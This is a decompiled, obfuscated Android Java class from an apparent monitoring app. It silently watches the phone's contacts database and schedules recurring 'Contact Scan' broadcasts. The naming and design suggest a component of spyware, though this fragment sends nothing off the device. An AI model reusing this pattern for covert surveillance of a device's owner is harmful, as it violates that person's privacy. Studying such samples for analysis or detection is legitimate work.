package com.network.android.monitor.observer;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.HandlerThread;
import android.provider.ContactsContract;
import com.network.android.monitor.a.a;
import com.network.media.CoreReceiver;
import java.util.HashMap;
import java.util.Map;
import java.util.Timer;

public final class g extends r {

    /* renamed from: a  reason: collision with root package name */
    static boolean f92a = false;
    private static final String[] e = new String[0];
    private static final Uri f = ContactsContract.Contacts.CONTENT_URI;
    private static Handler g;
    Timer b = new Timer();
    private ContentObserver h;
    private int i = 0;
    private Map j = new HashMap();
    private long k = 300000;
    private boolean l = true;
    private boolean m = false;
    private boolean n = false;
    private long o = 0;

    static {
        HandlerThread handlerThread = new HandlerThread("MyContact");
        handlerThread.start();
        g = new Handler(handlerThread.getLooper());
    }

    public g(boolean z) {
        this.l = z;
    }

    @Override // com.network.android.monitor.a.d
    public final void a(a aVar) {
        super.a(aVar);
        com.network.android.c.a.a.a("ContactWatcher start ");
        com.network.e.a.a aVar2 = (com.network.e.a.a) aVar;
        i.a(aVar2.a());
        if (this.h == null) {
            Context a2 = aVar2.a();
            this.h = new h(this, aVar2);
            a2.getContentResolver().registerContentObserver(f, true, this.h);
            com.network.android.c.a.a.a("AndroidContactWatcher registerContentObserver ");
        }
        com.network.android.c.a.a.a("ContactWatcher start ended ");
    }

    @Override // com.network.android.monitor.observer.r
    public final void a(com.network.e.a.a aVar) {
        try {
            com.network.android.c.a.a.a("Contacts service ");
            if (this.o == 0 || System.currentTimeMillis() - this.o > 30000) {
                com.network.android.c.a.a.a("Contacts Event start  ");
                f92a = true;
                this.o = System.currentTimeMillis();
                Context a2 = aVar.a();
                Intent intent = new Intent(a2, CoreReceiver.class);
                intent.setAction("Contact Scan");
                PendingIntent broadcast = PendingIntent.getBroadcast(a2, 0, intent, 0);
                com.network.android.c.a.a.a("Contacts scan will be in: 120000");
                ((AlarmManager) a2.getSystemService("alarm")).set(0, System.currentTimeMillis() + 120000, broadcast);
                com.network.android.c.a.a.a("Contacts Event end ");
            }
        } catch (Throwable th) {
            com.network.android.c.a.a.a("Contacts service  listener Exception- " + th.getMessage(), th);
        }
    }

    @Override // com.network.android.monitor.observer.r
    public final String[] a() {
        return e;
    }
}
